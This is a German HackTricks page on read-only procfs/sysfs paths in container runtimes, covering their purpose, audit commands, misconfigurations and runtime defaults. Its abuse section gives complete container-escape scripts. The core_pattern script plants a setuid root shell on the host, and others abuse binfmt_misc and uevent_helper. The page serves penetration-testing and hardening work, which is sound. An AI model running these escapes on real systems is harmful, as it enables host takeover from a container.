# Schreibgeschützte Systempfade

{{#include ../../../../banners/hacktricks-training.md}}

Schreibgeschützte Systempfade sind ein eigener Schutzmechanismus, getrennt von masked paths. Anstatt einen Pfad komplett zu verbergen, macht der runtime ihn sichtbar, hängt ihn aber schreibgeschützt ein. Das ist üblich für ausgewählte procfs- und sysfs-Standorte, bei denen Lesezugriff akzeptabel oder betrieblich notwendig sein kann, Schreibzugriffe jedoch zu gefährlich wären.

Der Zweck ist einfach: Viele Kernel-Schnittstellen werden deutlich gefährlicher, wenn sie beschreibbar sind. Ein schreibgeschützter Mount entfernt nicht den gesamten Aufklärungswert, verhindert aber, dass eine kompromittierte workload die darunterliegenden kernel-nahen Dateien über diesen Pfad verändert.

## Funktionsweise

Runtimes markieren häufig Teile der proc/sys-Ansicht als schreibgeschützt. Je nach runtime und Host kann dies Pfade wie beinhalten:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die konkrete Liste variiert, aber das Modell ist dasselbe: Sichtbarkeit dort erlauben, wo sie benötigt wird, Änderungen standardmäßig verweigern.

## Labor

Untersuche die von Docker deklarierten schreibgeschützten Pfade:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Untersuche die gemountete proc/sys-Ansicht aus dem Inneren des Containers:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sicherheitsauswirkungen

Schreibgeschützte Systempfade engen eine große Klasse host-bezogenen Missbrauchs ein. Selbst wenn ein Angreifer procfs oder sysfs einsehen kann, verhindert fehlende Schreibberechtigung dort viele direkte Änderungswege, die Kernel-Tunables, Crash-Handler, Helfer zum Laden von Modulen oder andere Steuerungsinterfaces betreffen. Die Angriffsfläche verschwindet nicht, aber der Übergang von Informationsoffenlegung zu Einfluss auf den Host wird deutlich schwieriger.

## Fehlkonfigurationen

Die häufigsten Fehler sind das Unmasking oder Remounten sensibler Pfade als read-write, das direkte Exponieren von Host proc/sys-Inhalten durch beschreibbare bind mounts oder die Verwendung privilegierter Modi, die die sichereren Runtime-Defaults effektiv umgehen. In Kubernetes treten `procMount: Unmasked` und privilegierte Workloads oft zusammen mit schwächerem proc-Schutz auf. Ein weiterer häufiger Betriebsfehler ist die Annahme, dass weil die Runtime diese Pfade normalerweise read-only einhängt, alle Workloads weiterhin dieses Default erben.

## Missbrauch

Wenn der Schutz schwach ist, beginnen Sie damit, nach beschreibbaren proc/sys-Einträgen zu suchen:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wenn schreibbare Einträge vorhanden sind, gehören zu den besonders wertvollen Folgewegen:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Was diese Befehle offenbaren können:

- Schreibbare Einträge unter `/proc/sys` bedeuten oft, dass der Container das Verhalten des Host-Kernels verändern kann, statt es nur zu inspizieren.
- `core_pattern` ist besonders wichtig, weil ein schreibbarer hostseitiger Wert in einen Pfad zur Codeausführung auf dem Host verwandelt werden kann, indem ein Prozess nach dem Setzen eines pipe handler zum Absturz gebracht wird.
- `modprobe` zeigt den Helper, den der Kernel für module-loading-bezogene Abläufe verwendet; es ist ein klassisches High-Value-Ziel, wenn es schreibbar ist.
- `binfmt_misc` sagt aus, ob eine Registrierung benutzerdefinierter Interpreter möglich ist. Wenn die Registrierung schreibbar ist, kann dies zu einer execution primitive werden statt nur eines information leak.
- `panic_on_oom` steuert eine hostweite Kernel-Entscheidung und kann deshalb Ressourcenerschöpfung in einen host denial of service verwandeln.
- `uevent_helper` ist eines der deutlichsten Beispiele dafür, dass ein schreibbarer sysfs-Helper-Pfad Host-Kontext-Ausführung erzeugt.

Interessante Funde sind schreibbare hostseitige proc-Schalter oder sysfs-Einträge, die normalerweise schreibgeschützt sein sollten. Ab diesem Punkt hat sich die Workload von einer eingeschränkten Container-Perspektive hin zu bedeutendem Kernel-Einfluss verschoben.

### Vollständiges Beispiel: `core_pattern` Host Escape

Wenn `/proc/sys/kernel/core_pattern` von innerhalb des Containers schreibbar ist und auf die Host-Kernel-Ansicht zeigt, kann es missbraucht werden, um nach einem Absturz ein Payload auszuführen:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Wenn der Pfad tatsächlich den Host-Kernel erreicht, läuft der payload auf dem Host und hinterlässt eine setuid shell.

### Vollständiges Beispiel: `binfmt_misc`-Registrierung

Wenn `/proc/sys/fs/binfmt_misc/register` beschreibbar ist, kann eine benutzerdefinierte Interpreter-Registrierung code execution erzeugen, wenn die passende Datei ausgeführt wird:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Auf einem host-zugänglichen, beschreibbaren `binfmt_misc` führt das zu Codeausführung im vom Kernel aufgerufenen Interpreterpfad.

### Vollständiges Beispiel: `uevent_helper`

Wenn `/sys/kernel/uevent_helper` beschreibbar ist, kann der Kernel ein Hilfsprogramm mit Host-Pfad aufrufen, wenn ein passendes Ereignis ausgelöst wird:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Der Grund, warum das so gefährlich ist, ist, dass der Hilfspfad aus der Perspektive des Host-Dateisystems aufgelöst wird, anstatt aus einem sicheren, ausschließlich containerinternen Kontext.

## Checks

Diese Checks bestimmen, ob die procfs/sysfs-Exposition dort, wo erwartet, schreibgeschützt ist und ob die Workload weiterhin sensible Kernel-Schnittstellen ändern kann.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Was hier interessant ist:

- Eine normal gehärtete Workload sollte nur sehr wenige beschreibbare `/proc/sys`-Einträge freigeben.
- Beschreibbare `/proc/sys`-Pfade sind oft wichtiger als gewöhnlicher Lesezugriff.
- Wenn die Runtime angibt, dass ein Pfad schreibgeschützt ist, er in der Praxis aber beschreibbar ist, prüfen Sie sorgfältig Mount-Propagation, Bind-Mounts und Privilegieneinstellungen.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig aktiviert | Docker definiert eine standardmäßige Liste schreibgeschützter Pfade für sensible proc-Einträge | Freigabe von Host-`/proc/sys`-Mounts, `--privileged` |
| Podman | Standardmäßig aktiviert | Podman wendet standardmäßige schreibgeschützte Pfade an, sofern sie nicht ausdrücklich gelockert werden | `--security-opt unmask=ALL`, weitreichende Host-Mounts, `--privileged` |
| Kubernetes | Erbt die Standardeinstellungen des Runtimes | Verwendet das schreibgeschützte Pfadmodell der zugrundeliegenden Runtime, sofern es nicht durch Pod-Einstellungen oder Host-Mounts abgeschwächt wird | `procMount: Unmasked`, privilegierte Workloads, beschreibbare Host-`/proc/sys`-Mounts |
| containerd / CRI-O under Kubernetes | Runtime-Standard | Greift normalerweise auf OCI-/Runtime-Standards zurück | wie in der Kubernetes-Zeile; direkte Änderungen an der Runtime-Konfiguration können das Verhalten abschwächen |

Der Kernpunkt ist, dass schreibgeschützte Systempfade meist als Runtime-Standard vorhanden sind, sich aber leicht durch privilegierte Modi oder Host-Bind-Mounts untergraben lassen.
{{#include ../../../../banners/hacktricks-training.md}}
